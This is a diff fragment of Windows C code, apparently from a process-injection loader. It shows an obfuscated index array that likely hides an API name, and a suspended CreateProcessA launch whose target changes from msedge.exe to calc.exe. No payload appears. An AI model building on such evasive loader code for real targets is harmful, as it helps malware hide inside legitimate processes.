@@ -127,7 +127,7 @@ int main(int argc, char* argv[]) {
 
     char* notpa[] = {28, 64, 63, 48, 8, 13, 3, 14, 22, 18, 63, 44, 24, 18, 19, 4, 12, 55, 54, 63, 13, 14, 19, 4, 15, 0, 3, 62, 4, 23, 4};
     
-    CreateProcessA("C:\\Windows\\System32\\cmd.exe", (LPSTR) "/c start msedge.exe", NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFO)&si, &pi);
+    CreateProcessA("C:\\Windows\\System32\\cmd.exe", (LPSTR) "/c start calc.exe", NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFO)&si, &pi);
 
     HANDLE hProcess = pi.hProcess;
     HANDLE hThread = pi.hThread;
